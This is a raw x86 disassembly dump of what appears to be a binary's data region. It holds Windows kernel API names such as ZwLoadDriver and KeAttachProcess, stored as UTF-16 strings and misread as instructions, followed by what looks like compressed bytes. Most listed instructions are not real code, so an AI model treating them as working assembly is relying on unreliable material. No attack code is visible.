   1e0d0:	ins    BYTE PTR es:[edi],dx
   1e0d1:	add    BYTE PTR [ebp+0x0],dh
   1e0d4:	ins    DWORD PTR es:[edi],dx
   1e0d5:	add    BYTE PTR [ebp+0x0],ah
   1e0d8:	dec    ecx
   1e0d9:	add    BYTE PTR [esi+0x0],ch
   1e0dc:	data16 add BYTE PTR [edi+0x0],ch
   1e0e0:	jb     0x1e0e2
   1e0e2:	ins    DWORD PTR es:[edi],dx
   1e0e3:	add    BYTE PTR [ecx+0x0],ah
   1e0e6:	je     0x1e0e8
   1e0e8:	imul   eax,DWORD PTR [eax],0x6e006f
   1e0ee:	inc    esi
   1e0ef:	add    BYTE PTR [ecx+0x0],ch
   1e0f2:	ins    BYTE PTR es:[edi],dx
   1e0f3:	add    BYTE PTR [ebp+0x0],ah
   1e0f6:	add    BYTE PTR [eax],al
   1e0f8:	pop    edx
   1e0f9:	add    BYTE PTR [edi+0x0],dh
   1e0fc:	inc    ebx
   1e0fd:	add    BYTE PTR [edx+0x0],dh
   1e100:	add    BYTE PTR gs:[ecx+0x0],ah
   1e104:	je     0x1e106
   1e106:	add    BYTE PTR gs:[esi+0x0],al
   1e10a:	imul   eax,DWORD PTR [eax],0x65006c
   1e110:	add    BYTE PTR [eax],al
   1e112:	push   edx
   1e113:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e117:	add    BYTE PTR [ecx+0x0],cl
   1e11a:	ins    DWORD PTR es:[edi],dx
   1e11b:	add    BYTE PTR [ecx+0x0],ah
   1e11e:	add    BYTE PTR [di+0x0],ah
   1e122:	dec    esi
   1e123:	add    BYTE PTR [eax+eax*1+0x48],dh
   1e127:	add    BYTE PTR [ebp+0x0],ah
   1e12a:	popa   
   1e12b:	add    BYTE PTR [eax+eax*1+0x65],ah
   1e12f:	add    BYTE PTR [edx+0x0],dh
   1e132:	add    BYTE PTR [eax],al
   1e134:	push   edx
   1e135:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e139:	add    BYTE PTR [ecx+0x0],cl
   1e13c:	ins    DWORD PTR es:[edi],dx
   1e13d:	add    BYTE PTR [ecx+0x0],ah
   1e140:	add    BYTE PTR [di+0x0],ah
   1e144:	inc    esp
   1e145:	add    BYTE PTR [ecx+0x0],ch
   1e148:	jb     0x1e14a
   1e14a:	add    BYTE PTR gs:[ebx+0x0],ah
   1e14e:	je     0x1e150
   1e150:	outs   dx,DWORD PTR ds:[esi]
   1e151:	add    BYTE PTR [edx+0x0],dh
   1e154:	jns    0x1e156
   1e156:	inc    ebp
   1e157:	add    BYTE PTR [esi+0x0],ch
   1e15a:	je     0x1e15c
   1e15c:	jb     0x1e15e
   1e15e:	jns    0x1e160
   1e160:	push   esp
   1e161:	add    BYTE PTR [edi+0x0],ch
   1e164:	inc    esp
   1e165:	add    BYTE PTR [ecx+0x0],ah
   1e168:	je     0x1e16a
   1e16a:	popa   
   1e16b:	add    BYTE PTR [eax],al
   1e16d:	add    BYTE PTR [edx+0x0],bl
   1e170:	ja     0x1e172
   1e172:	dec    edi
   1e173:	add    BYTE PTR [eax+0x0],dh
   1e176:	add    BYTE PTR gs:[esi+0x0],ch
   1e17a:	push   eax
   1e17b:	add    BYTE PTR [edx+0x0],dh
   1e17e:	outs   dx,DWORD PTR ds:[esi]
   1e17f:	add    BYTE PTR [ebx+0x0],ah
   1e182:	add    BYTE PTR gs:[ebx+0x0],dh
   1e186:	jae    0x1e188
   1e188:	push   esp
   1e189:	add    BYTE PTR [edi+0x0],ch
   1e18c:	imul   eax,DWORD PTR [eax],0x65
   1e18f:	add    BYTE PTR [esi+0x0],ch
   1e192:	add    BYTE PTR [eax],al
   1e194:	pop    edx
   1e195:	add    BYTE PTR [edi+0x0],dh
   1e198:	push   ebx
   1e199:	add    BYTE PTR [ebp+0x0],ah
   1e19c:	je     0x1e19e
   1e19e:	dec    ecx
   1e19f:	add    BYTE PTR [esi+0x0],ch
   1e1a2:	data16 add BYTE PTR [edi+0x0],ch
   1e1a6:	jb     0x1e1a8
   1e1a8:	ins    DWORD PTR es:[edi],dx
   1e1a9:	add    BYTE PTR [ecx+0x0],ah
   1e1ac:	je     0x1e1ae
   1e1ae:	imul   eax,DWORD PTR [eax],0x6e006f
   1e1b4:	push   eax
   1e1b5:	add    BYTE PTR [edx+0x0],dh
   1e1b8:	outs   dx,DWORD PTR ds:[esi]
   1e1b9:	add    BYTE PTR [ebx+0x0],ah
   1e1bc:	add    BYTE PTR gs:[ebx+0x0],dh
   1e1c0:	jae    0x1e1c2
   1e1c2:	add    BYTE PTR [eax],al
   1e1c4:	pop    edx
   1e1c5:	add    BYTE PTR [edi+0x0],dh
   1e1c8:	push   ecx
   1e1c9:	add    BYTE PTR [ebp+0x0],dh
   1e1cc:	add    BYTE PTR gs:[edx+0x0],dh
   1e1d0:	jns    0x1e1d2
   1e1d2:	dec    ecx
   1e1d3:	add    BYTE PTR [esi+0x0],ch
   1e1d6:	data16 add BYTE PTR [edi+0x0],ch
   1e1da:	jb     0x1e1dc
   1e1dc:	ins    DWORD PTR es:[edi],dx
   1e1dd:	add    BYTE PTR [ecx+0x0],ah
   1e1e0:	je     0x1e1e2
   1e1e2:	imul   eax,DWORD PTR [eax],0x6e006f
   1e1e8:	push   esp
   1e1e9:	add    BYTE PTR [eax+0x0],ch
   1e1ec:	jb     0x1e1ee
   1e1ee:	add    BYTE PTR gs:[ecx+0x0],ah
   1e1f2:	add    BYTE PTR fs:[eax],al
   1e1f5:	add    BYTE PTR [edx+0x0],bl
   1e1f8:	ja     0x1e1fa
   1e1fa:	inc    ebx
   1e1fb:	add    BYTE PTR [eax+eax*1+0x6f],ch
   1e1ff:	add    BYTE PTR [ebx+0x0],dh
   1e202:	add    BYTE PTR gs:[eax],al
   1e205:	add    BYTE PTR [edx+0x0],dl
   1e208:	je     0x1e20a
   1e20a:	ins    BYTE PTR es:[edi],dx
   1e20b:	add    BYTE PTR [ecx+0x0],al
   1e20e:	jae    0x1e210
   1e210:	jae    0x1e212
   1e212:	add    BYTE PTR gs:[edx+0x0],dh
   1e216:	je     0x1e218
   1e218:	add    BYTE PTR [eax],al
   1e21a:	pop    edx
   1e21b:	add    BYTE PTR [edi+0x0],dh
   1e21e:	inc    ebp
   1e21f:	add    BYTE PTR [esi+0x0],ch
   1e222:	jne    0x1e224
   1e224:	ins    DWORD PTR es:[edi],dx
   1e225:	add    BYTE PTR [ebp+0x0],ah
   1e228:	jb     0x1e22a
   1e22a:	popa   
   1e22b:	add    BYTE PTR [eax+eax*1+0x65],dh
   1e22f:	add    BYTE PTR [ebx+0x0],cl
   1e232:	add    BYTE PTR gs:[ecx+0x0],bh
   1e236:	add    BYTE PTR [eax],al
   1e238:	pop    edx
   1e239:	add    BYTE PTR [edi+0x0],dh
   1e23c:	dec    esp
   1e23d:	add    BYTE PTR [edi+0x0],ch
   1e240:	popa   
   1e241:	add    BYTE PTR [eax+eax*1+0x44],ah
   1e245:	add    BYTE PTR [edx+0x0],dh
   1e248:	imul   eax,DWORD PTR [eax],0x650076
   1e24e:	jb     0x1e250
   1e250:	add    BYTE PTR [eax],al
   1e252:	pop    edx
   1e253:	add    BYTE PTR [edi+0x0],dh
   1e256:	inc    ebx
   1e257:	add    BYTE PTR [edx+0x0],dh
   1e25a:	add    BYTE PTR gs:[ecx+0x0],ah
   1e25e:	je     0x1e260
   1e260:	add    BYTE PTR gs:[ebx+0x0],cl
   1e264:	add    BYTE PTR gs:[ecx+0x0],bh
   1e268:	add    BYTE PTR [eax],al
   1e26a:	dec    ecx
   1e26b:	add    BYTE PTR [edi+0x0],ch
   1e26e:	inc    esp
   1e26f:	add    BYTE PTR [ebp+0x0],ah
   1e272:	ins    BYTE PTR es:[edi],dx
   1e273:	add    BYTE PTR [ebp+0x0],ah
   1e276:	je     0x1e278
   1e278:	add    BYTE PTR gs:[eax+eax*1+0x65],al
   1e27d:	add    BYTE PTR [esi+0x0],dh
   1e280:	imul   eax,DWORD PTR [eax],0x650063
   1e286:	add    BYTE PTR [eax],al
   1e288:	dec    ebx
   1e289:	add    BYTE PTR [ebp+0x0],ah
   1e28c:	inc    esp
   1e28d:	add    BYTE PTR [ebp+0x0],ah
   1e290:	je     0x1e292
   1e292:	popa   
   1e293:	add    BYTE PTR [ebx+0x0],ah
   1e296:	push   0x72005000
   1e29b:	add    BYTE PTR [edi+0x0],ch
   1e29e:	arpl   WORD PTR [eax],ax
   1e2a0:	add    BYTE PTR gs:[ebx+0x0],dh
   1e2a4:	jae    0x1e2a6
   1e2a6:	add    BYTE PTR [eax],al
   1e2a8:	dec    ebx
   1e2a9:	add    BYTE PTR [ebp+0x0],ah
   1e2ac:	inc    ecx
   1e2ad:	add    BYTE PTR [eax+eax*1+0x74],dh
   1e2b1:	add    BYTE PTR [ecx+0x0],ah
   1e2b4:	arpl   WORD PTR [eax],ax
   1e2b6:	push   0x72005000
   1e2bb:	add    BYTE PTR [edi+0x0],ch
   1e2be:	arpl   WORD PTR [eax],ax
   1e2c0:	add    BYTE PTR gs:[ebx+0x0],dh
   1e2c4:	jae    0x1e2c6
   1e2c6:	add    BYTE PTR [eax],al
   1e2c8:	pop    edx
   1e2c9:	add    BYTE PTR [edi+0x0],dh
   1e2cc:	push   ecx
   1e2cd:	add    BYTE PTR [ebp+0x0],dh
   1e2d0:	add    BYTE PTR gs:[edx+0x0],dh
   1e2d4:	jns    0x1e2d6
   1e2d6:	push   esi
   1e2d7:	add    BYTE PTR [ecx+0x0],ah
   1e2da:	ins    BYTE PTR es:[edi],dx
   1e2db:	add    BYTE PTR [ebp+0x0],dh
   1e2de:	add    BYTE PTR gs:[ebx+0x0],cl
   1e2e2:	add    BYTE PTR gs:[ecx+0x0],bh
   1e2e6:	add    BYTE PTR [eax],al
   1e2e8:	pop    edx
   1e2e9:	add    BYTE PTR [edi+0x0],dh
   1e2ec:	push   edx
   1e2ed:	add    BYTE PTR [ebp+0x0],ah
   1e2f0:	popa   
   1e2f1:	add    BYTE PTR [eax+eax*1+0x46],ah
   1e2f5:	add    BYTE PTR [ecx+0x0],ch
   1e2f8:	ins    BYTE PTR es:[edi],dx
   1e2f9:	add    BYTE PTR [ebp+0x0],ah
   1e2fc:	add    BYTE PTR [eax],al
   1e2fe:	pop    edx
   1e2ff:	add    BYTE PTR [edi+0x0],dh
   1e302:	push   ebx
   1e303:	add    BYTE PTR [ebp+0x0],ah
   1e306:	je     0x1e308
   1e308:	dec    ecx
   1e309:	add    BYTE PTR [esi+0x0],ch
   1e30c:	data16 add BYTE PTR [edi+0x0],ch
   1e310:	jb     0x1e312
   1e312:	ins    DWORD PTR es:[edi],dx
   1e313:	add    BYTE PTR [ecx+0x0],ah
   1e316:	je     0x1e318
   1e318:	imul   eax,DWORD PTR [eax],0x6e006f
   1e31e:	inc    esi
   1e31f:	add    BYTE PTR [ecx+0x0],ch
   1e322:	ins    BYTE PTR es:[edi],dx
   1e323:	add    BYTE PTR [ebp+0x0],ah
   1e326:	add    BYTE PTR [eax],al
   1e328:	pop    edx
   1e329:	add    BYTE PTR [edi+0x0],dh
   1e32c:	push   edi
   1e32d:	add    BYTE PTR [edx+0x0],dh
   1e330:	imul   eax,DWORD PTR [eax],0x650074
   1e336:	inc    esi
   1e337:	add    BYTE PTR [ecx+0x0],ch
   1e33a:	ins    BYTE PTR es:[edi],dx
   1e33b:	add    BYTE PTR [ebp+0x0],ah
   1e33e:	add    BYTE PTR [eax],al
   1e340:	pop    edx
   1e341:	add    BYTE PTR [edi+0x0],dh
   1e344:	push   ecx
   1e345:	add    BYTE PTR [ebp+0x0],dh
   1e348:	add    BYTE PTR gs:[edx+0x0],dh
   1e34c:	jns    0x1e34e
   1e34e:	dec    ecx
   1e34f:	add    BYTE PTR [esi+0x0],ch
   1e352:	data16 add BYTE PTR [edi+0x0],ch
   1e356:	jb     0x1e358
   1e358:	ins    DWORD PTR es:[edi],dx
   1e359:	add    BYTE PTR [ecx+0x0],ah
   1e35c:	je     0x1e35e
   1e35e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e364:	inc    esi
   1e365:	add    BYTE PTR [ecx+0x0],ch
   1e368:	ins    BYTE PTR es:[edi],dx
   1e369:	add    BYTE PTR [ebp+0x0],ah
   1e36c:	add    BYTE PTR [eax],al
   1e36e:	dec    ecx
   1e36f:	add    BYTE PTR [edi+0x0],ch
   1e372:	inc    ebx
   1e373:	add    BYTE PTR [edx+0x0],dh
   1e376:	add    BYTE PTR gs:[ecx+0x0],ah
   1e37a:	je     0x1e37c
   1e37c:	add    BYTE PTR gs:[ebx+0x0],dl
   1e380:	jns    0x1e382
   1e382:	ins    DWORD PTR es:[edi],dx
   1e383:	add    BYTE PTR [edx+0x0],ah
   1e386:	outs   dx,DWORD PTR ds:[esi]
   1e387:	add    BYTE PTR [eax+eax*1+0x69],ch
   1e38b:	add    BYTE PTR [ebx+0x0],ah
   1e38e:	dec    esp
   1e38f:	add    BYTE PTR [ecx+0x0],ch
   1e392:	outs   dx,BYTE PTR ds:[esi]
   1e393:	add    BYTE PTR [ebx+0x0],ch
   1e396:	add    BYTE PTR [eax],al
   1e398:	dec    ecx
   1e399:	add    BYTE PTR [edi+0x0],ch
   1e39c:	inc    ebx
   1e39d:	add    BYTE PTR [edx+0x0],dh
   1e3a0:	add    BYTE PTR gs:[ecx+0x0],ah
   1e3a4:	je     0x1e3a6
   1e3a6:	add    BYTE PTR gs:[eax+eax*1+0x65],al
   1e3ab:	add    BYTE PTR [esi+0x0],dh
   1e3ae:	imul   eax,DWORD PTR [eax],0x650063
   1e3b4:	add    BYTE PTR [eax],al
   1e3b6:	push   ebx
   1e3b7:	add    BYTE PTR [ebp+0x0],ah
   1e3ba:	inc    ebx
   1e3bb:	add    BYTE PTR [edx+0x0],dh
   1e3be:	add    BYTE PTR gs:[ecx+0x0],ah
   1e3c2:	je     0x1e3c4
   1e3c4:	add    BYTE PTR gs:[ebx+0x0],al
   1e3c8:	ins    BYTE PTR es:[edi],dx
   1e3c9:	add    BYTE PTR [ecx+0x0],ch
   1e3cc:	add    BYTE PTR gs:[esi+0x0],ch
   1e3d0:	je     0x1e3d2
   1e3d2:	push   ebx
   1e3d3:	add    BYTE PTR [ebp+0x0],ah
   1e3d6:	arpl   WORD PTR [eax],ax
   1e3d8:	jne    0x1e3da
   1e3da:	jb     0x1e3dc
   1e3dc:	imul   eax,DWORD PTR [eax],0x790074
   1e3e2:	add    BYTE PTR [eax],al
   1e3e4:	pop    edx
   1e3e5:	add    BYTE PTR [edi+0x0],dh
   1e3e8:	dec    ebp
   1e3e9:	add    BYTE PTR [ecx+0x0],ah
   1e3ec:	jo     0x1e3ee
   1e3ee:	push   esi
   1e3ef:	add    BYTE PTR [ecx+0x0],ch
   1e3f2:	add    BYTE PTR gs:[edi+0x0],dh
   1e3f6:	dec    edi
   1e3f7:	add    BYTE PTR [esi+0x0],ah
   1e3fa:	push   ebx
   1e3fb:	add    BYTE PTR [ebp+0x0],ah
   1e3fe:	arpl   WORD PTR [eax],ax
   1e400:	je     0x1e402
   1e402:	imul   eax,DWORD PTR [eax],0x6e006f
   1e408:	add    BYTE PTR [eax],al
   1e40a:	pop    edx
   1e40b:	add    BYTE PTR [edi+0x0],dh
   1e40e:	inc    ebx
   1e40f:	add    BYTE PTR [edx+0x0],dh
   1e412:	add    BYTE PTR gs:[ecx+0x0],ah
   1e416:	je     0x1e418
   1e418:	add    BYTE PTR gs:[ebx+0x0],dl
   1e41c:	add    BYTE PTR gs:[ebx+0x0],ah
   1e420:	je     0x1e422
   1e422:	imul   eax,DWORD PTR [eax],0x6e006f
   1e428:	add    BYTE PTR [eax],al
   1e42a:	pop    edx
   1e42b:	add    BYTE PTR [edi+0x0],dh
   1e42e:	push   ebp
   1e42f:	add    BYTE PTR [esi+0x0],ch
   1e432:	ins    DWORD PTR es:[edi],dx
   1e433:	add    BYTE PTR [ecx+0x0],ah
   1e436:	jo     0x1e438
   1e438:	push   esi
   1e439:	add    BYTE PTR [ecx+0x0],ch
   1e43c:	add    BYTE PTR gs:[edi+0x0],dh
   1e440:	dec    edi
   1e441:	add    BYTE PTR [esi+0x0],ah
   1e444:	push   ebx
   1e445:	add    BYTE PTR [ebp+0x0],ah
   1e448:	arpl   WORD PTR [eax],ax
   1e44a:	je     0x1e44c
   1e44c:	imul   eax,DWORD PTR [eax],0x6e006f
   1e452:	add    BYTE PTR [eax],al
   1e454:	dec    ebx
   1e455:	add    BYTE PTR [ebp+0x0],ah
   1e458:	dec    ecx
   1e459:	add    BYTE PTR [esi+0x0],ch
   1e45c:	imul   eax,DWORD PTR [eax],0x690074
   1e462:	popa   
   1e463:	add    BYTE PTR [eax+eax*1+0x69],ch
   1e467:	add    BYTE PTR [edx+0x0],bh
   1e46a:	add    BYTE PTR gs:[ebp+0x0],cl
   1e46e:	jne    0x1e470
   1e470:	je     0x1e472
   1e472:	add    BYTE PTR gs:[eax+0x0],bh
   1e476:	add    BYTE PTR [eax],al
   1e478:	push   edx
   1e479:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e47d:	add    BYTE PTR [ecx+0x0],cl
   1e480:	outs   dx,BYTE PTR ds:[esi]
   1e481:	add    BYTE PTR [ecx+0x0],ch
   1e484:	je     0x1e486
   1e486:	push   ebp
   1e487:	add    BYTE PTR [esi+0x0],ch
   1e48a:	imul   eax,DWORD PTR [eax],0x6f0063
   1e490:	add    BYTE PTR fs:[ebp+0x0],ah
   1e494:	push   ebx
   1e495:	add    BYTE PTR [eax+eax*1+0x72],dh
   1e499:	add    BYTE PTR [ecx+0x0],ch
   1e49c:	outs   dx,BYTE PTR ds:[esi]
   1e49d:	add    BYTE PTR [edi+0x0],ah
   1e4a0:	add    BYTE PTR [eax],al
   1e4a2:	push   eax
   1e4a3:	add    BYTE PTR [ebx+0x0],dh
   1e4a6:	dec    esp
   1e4a7:	add    BYTE PTR [edi+0x0],ch
   1e4aa:	outs   dx,DWORD PTR ds:[esi]
   1e4ab:	add    BYTE PTR [ebx+0x0],ch
   1e4ae:	jne    0x1e4b0
   1e4b0:	jo     0x1e4b2
   1e4b2:	push   eax
   1e4b3:	add    BYTE PTR [edx+0x0],dh
   1e4b6:	outs   dx,DWORD PTR ds:[esi]
   1e4b7:	add    BYTE PTR [ebx+0x0],ah
   1e4ba:	add    BYTE PTR gs:[ebx+0x0],dh
   1e4be:	jae    0x1e4c0
   1e4c0:	inc    edx
   1e4c1:	add    BYTE PTR [ecx+0x0],bh
   1e4c4:	push   eax
   1e4c5:	add    BYTE PTR [edx+0x0],dh
   1e4c8:	outs   dx,DWORD PTR ds:[esi]
   1e4c9:	add    BYTE PTR [ebx+0x0],ah
   1e4cc:	add    BYTE PTR gs:[ebx+0x0],dh
   1e4d0:	jae    0x1e4d2
   1e4d2:	dec    ecx
   1e4d3:	add    BYTE PTR [eax+eax*1+0x0],ah
   1e4d7:	add    BYTE PTR [ebx+0x0],cl
   1e4da:	add    BYTE PTR gs:[edi+0x0],al
   1e4de:	add    BYTE PTR gs:[eax+eax*1+0x43],dh
   1e4e3:	add    BYTE PTR [ebp+0x0],dh
   1e4e6:	jb     0x1e4e8
   1e4e8:	jb     0x1e4ea
   1e4ea:	add    BYTE PTR gs:[esi+0x0],ch
   1e4ee:	je     0x1e4f0
   1e4f0:	push   esp
   1e4f1:	add    BYTE PTR [eax+0x0],ch
   1e4f4:	jb     0x1e4f6
   1e4f6:	add    BYTE PTR gs:[ecx+0x0],ah
   1e4fa:	add    BYTE PTR fs:[eax],al
   1e4fd:	add    BYTE PTR [eax+eax*1+0x2d],dl
   1e501:	add    BYTE PTR [ecx],cl
   1e503:	add    BYTE PTR ds:0x90000000,dl
   1e509:	mov    al,ds:0xefa95866
   1e50e:	adc    bh,BYTE PTR [ebx]
   1e510:	and    eax,0xdad4f494
   1e515:	(bad)  
   1e516:	lods   al,BYTE PTR ds:[esi]
   1e517:	xlat   BYTE PTR ds:[ebx]
   1e518:	cs cli 
   1e51a:	xor    BYTE PTR [ebp+eax*4+0x63],0x2c
   1e51f:	or     BYTE PTR [ebx*1-0x4956e5e0],dh
   1e526:	in     al,0x92
   1e528:	out    dx,al
   1e529:	mov    ebp,0x78e4faab
   1e52e:	and    ebp,esp
   1e530:	dec    esp
   1e531:	cs icebp 
   1e533:	sub    DWORD PTR [esi+edx*2],edx
   1e536:	sbb    al,0x96
   1e538:	pushf  
   1e539:	pop    ds
   1e53a:	push   0x6de4edc4
   1e53f:	enter  0xbac4,0xe2
   1e543:	add    BYTE PTR [ebx+0x0],dl
   1e546:	daa    
   1e547:	add    BYTE PTR ds:0x6001300,dl
   1e54d:	add    BYTE PTR [eax],al
   1e54f:	add    BYTE PTR [edi+0x343db45e],cl
   1e555:	in     eax,0x71
   1e557:	jne    0x1e541
   1e559:	dec    ebx
   1e55a:	(bad)  
   1e55b:	fmul   QWORD PTR [ebx+0x17]
   1e55e:	aas    
   1e55f:	mov    ?,WORD PTR [edx]
   1e561:	xchg   esp,eax
   1e562:	pop    edx
   1e563:	retf   0x4ebe
   1e566:	jnp    0x1e540
   1e568:	adc    BYTE PTR [edi-0x24],dl
   1e56b:	pop    ebx
   1e56c:	jmp    0x1e56c
   1e56e:	add    DWORD PTR [ecx],edx
   1e570:	inc    esp
   1e571:	adc    al,0x7e
   1e573:	div    BYTE PTR [ebx+0x7a77e514]
   1e579:	mov    edi,0x558917
   1e57e:	mov    cl,0x38
   1e580:	test   BYTE PTR [ebp+0x48],ah
   1e583:	and    DWORD PTR [ebx],ecx
   1e585:	sub    edi,DWORD PTR [edx+0x49004c90]
   1e58b:	add    BYTE PTR [eax+eax*1],ah
   1e58e:	or     al,0x0
   1e590:	push   es
   1e591:	add    BYTE PTR [edx],al
   1e593:	add    BYTE PTR ds:0x15003100,dh
   1e599:	add    BYTE PTR [eax+eax*1],bl
   1e59c:	add    BYTE PTR [eax],al
   1e59e:	icebp  
   1e59f:	shl    ebx,1
   1e5a1:	cmp    BYTE PTR [edx+0x140f69df],ch
   1e5a7:	dec    ecx
   1e5a8:	icebp  
   1e5a9:	mov    cl,BYTE PTR [ebx]
   1e5ab:	xlat   BYTE PTR ds:[ebx]
   1e5ac:	cmp    eax,0x61ace524
   1e5b1:	add    al,0xab
   1e5b3:	push   ds
   1e5b4:	mov    cl,0x8d
   1e5b6:	iret   
   1e5b7:	pop    esi
   1e5b8:	and    edi,DWORD PTR [esi+0x53]
   1e5bb:	inc    ecx
   1e5bc:	mov    ebx,eax
   1e5be:	(bad)  
   1e5bf:	xchg   ebp,eax
   1e5c0:	and    DWORD PTR [ebx],0xf4364d83
   1e5c6:	sbb    ebx,ebx
   1e5c8:	pop    DWORD PTR [eax]
   1e5ca:	add    BYTE PTR cs:[edx+0x0],cl
   1e5ce:	or     BYTE PTR [eax],al
   1e5d0:	add    BYTE PTR [eax],al
   1e5d2:	add    BYTE PTR [eax],al
   1e5d4:	mov    bl,0x3
   1e5d6:	sub    DWORD PTR [ebx-0xa7e89f],esi
   1e5dc:	add    ebp,DWORD PTR [eax+0x5c]
   1e5df:	dec    BYTE PTR ds:0x4138c6c5
   1e5e5:	nop
   1e5e6:	xor    ah,dl
   1e5e8:	mov    bl,0x78
   1e5ea:	jg     0x1e5cc
   1e5ec:	pop    ecx
   1e5ed:	les    edx,FWORD PTR [edx]
   1e5ef:	xlat   BYTE PTR ds:[ebx]
   1e5f0:	jl     0x1e61b
   1e5f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
   1e5f3:	dec    edi
   1e5f4:	jbe    0x1e5e9
   1e5f6:	dec    esp
   1e5f7:	inc    edx
   1e5f8:	ins    DWORD PTR es:[edi],dx
   1e5f9:	add    BYTE PTR [esi+0x0],ch
   1e5fc:	sbb    al,BYTE PTR [eax]
   1e5fe:	adc    BYTE PTR [eax],al
   1e600:	or     BYTE PTR [eax],al
   1e602:	add    BYTE PTR [eax],al
   1e604:	inc    edx
   1e605:	add    BYTE PTR [edx+0x0],cl
   1e608:	or     BYTE PTR [eax],al
   1e60a:	add    BYTE PTR [eax],al
   1e60c:	add    BYTE PTR [eax],al
   1e60e:	je     0x1e682
   1e610:	outs   dx,BYTE PTR ds:[esi]
   1e611:	sbb    eax,0xdd484434
   1e616:	adc    al,0xda
   1e618:	retf   
   1e619:	adc    eax,0x3ac4ce8e
   1e61e:	cmp    edx,DWORD PTR [eax-0xd38a3e4]
   1e624:	mov    bl,0xb
   1e626:	mov    al,0xd2
   1e628:	data16 xor al,BYTE PTR [esi]
   1e62b:	cmp    ah,BYTE PTR [edx]
   1e62d:	sub    esp,0x30
   1e630:	arpl   WORD PTR [ebx],bp
   1e632:	imul   edi,DWORD PTR [edx],0x274200f7
   1e638:	add    BYTE PTR ds:0x465cc00,dl
   1e63e:	enter  0xa4a2,0x93
   1e642:	test   DWORD PTR [edi+0x1dab471f],ecx
   1e648:	aaa    
   1e649:	sub    ch,bh
   1e64b:	sub    BYTE PTR [edi+0x6c9deb2e],0x52
   1e652:	xor    cl,bh
   1e654:	jmp    0x56d46ab4
   1e659:	cmp    eax,0x3a7adb7c
   1e65e:	pop    edi
   1e65f:	cmp    eax,0x9220fee7
   1e664:	add    eax,0x93f5300
   1e669:	add    BYTE PTR ds:0xc83b6300,dl
   1e66f:	mov    eax,ds:0xf20a21da
   1e674:	dec    esp
   1e675:	dec    ecx
   1e676:	sub    ah,BYTE PTR [ebp+0x1038f085]
   1e67c:	out    dx,eax
   1e67d:	addr16 jg 0x1e6a7
   1e680:	xor    edx,edi
   1e682:	jmp    0x8f6b0b0e
   1e687:	mov    ds:0x7808404e,al
   1e68c:	cwde   
   1e68d:	lds    ecx,FWORD PTR [eax]
   1e68f:	mov    dl,ch
   1e691:	mov    ds:0xe337f349,al
   1e696:	scas   al,BYTE PTR es:[edi]
   1e697:	cmp    eax,0x3143001d
   1e69c:	pop    ss
   1e69d:	add    al,0x15
   1e69f:	adc    DWORD PTR [ecx],esi
   1e6a1:	cmp    al,0x1a
   1e6a3:	pop    ss
   1e6a4:	add    al,0x5
   1e6a6:	add    ah,cl
   1e6a8:	inc    eax
   1e6a9:	sub    eax,0xec36742e
   1e6ae:	test   BYTE PTR [esi*4-0x1538dd3e],al
   1e6b5:	push   ebp
   1e6b6:	pop    edx
   1e6b7:	or     eax,0x86d7fab6
   1e6bc:	sbb    eax,0xc34de549
   1e6c1:	sbb    al,0x31
   1e6c3:	mov    eax,0xe4a4ff42
   1e6c8:	inc    esi
   1e6c9:	sub    al,0x60
   1e6cb:	test   eax,0x4e74aa7c
   1e6d0:	xor    al,0x38
   1e6d2:	inc    ebp
   1e6d3:	mov    al,ds:0xaa52e29f
   1e6d8:	sub    eax,0x305e9861
   1e6dd:	xor    eax,0x234ccc00
   1e6e2:	push   cs
   1e6e3:	add    eax,0x100b2528
   1e6e8:	adc    edx,DWORD PTR [ebx]
   1e6ea:	or     edi,DWORD PTR [eax]
   1e6ec:	add    ah,cl
   1e6ee:	cmp    al,0xbc
   1e6f0:	add    dh,ch
   1e6f2:	scas   al,BYTE PTR es:[edi]
   1e6f3:	pop    edi
   1e6f4:	jnp    0x1e6e4
   1e6f6:	cmp    DWORD PTR [edi],0xd79d29a3
   1e6fc:	dec    edi
   1e6fd:	cli    
   1e6fe:	push   ebx
   1e6ff:	ret    
   1e700:	adc    eax,0x54efb253
   1e705:	cmp    esp,DWORD PTR ds:0x4e21cdbd
   1e70b:	loope  0x1e727
   1e70d:	out    dx,eax
   1e70e:	push   ss
   1e70f:	scas   al,BYTE PTR es:[edi]
   1e710:	cmp    eax,0x9e48398b
   1e715:	inc    edi
   1e716:	clc    
   1e717:	mov    ds:0xbc8482d7,eax
   1e71c:	add    ah,cl
   1e71e:	dec    esp
   1e71f:	and    ecx,DWORD PTR [esi]
   1e721:	add    eax,0x100b2528
   1e726:	adc    edx,DWORD PTR [ebx]
   1e728:	or     ebp,DWORD PTR [esi]
   1e72a:	add    ah,cl
   1e72c:	pop    ebx
   1e72d:	sub    edx,DWORD PTR [ecx]
   1e72f:	jo     0x1e70a
   1e731:	and    DWORD PTR [esi+0x37ec17fe],eax
   1e737:	lds    ecx,FWORD PTR [edi]
   1e739:	fadd   QWORD PTR [ecx]
   1e73b:	sbb    BYTE PTR [ebx+0x16],dl
   1e73e:	outs   dx,BYTE PTR ds:[esi]
   1e73f:	dec    edi
   1e740:	shl    BYTE PTR [ebx-0x56],cl
   1e743:	std    
   1e744:	or     eax,0xb22596ae
   1e749:	clc    
   1e74a:	cli    
   1e74b:	add    al,0xed
   1e74d:	pop    esi
   1e74e:	mov    ds:0xaa11acfe,eax
   1e753:	and    eax,0xc9c24f9e
   1e758:	mov    cl,0xda
   1e75a:	iret   
   1e75b:	out    dx,al
   1e75c:	or     al,0x62
   1e75e:	mov    al,ds:0xe4a247e
   1e763:	push   ss
   1e764:	add    DWORD PTR [edx+0x376f3e],ecx
   1e76a:	imul   eax,DWORD PTR [eax],0xe
   1e76d:	add    BYTE PTR [edi],dl
   1e76f:	add    BYTE PTR [eax+eax*1],bl
   1e772:	or     eax,DWORD PTR [eax]
   1e774:	or     DWORD PTR [eax],eax
   1e776:	pop    edi
   1e777:	add    BYTE PTR [ecx],al
   1e779:	add    BYTE PTR [eax+eax*1],bl
   1e77c:	dec    edx
   1e77d:	add    BYTE PTR [eax],cl
   1e77f:	add    BYTE PTR [eax],al
   1e781:	add    BYTE PTR [eax],al
   1e783:	add    BYTE PTR [ebp-0xb],cl
   1e786:	adc    ebx,0x9a5f9945
   1e78c:	cmp    al,0x9f
   1e78e:	leave  
   1e78f:	push   esi
   1e790:	xlat   BYTE PTR ds:[ebx]
   1e791:	and    DWORD PTR [edi+ebp*4+0x77],eax
   1e795:	mov    dh,0x45
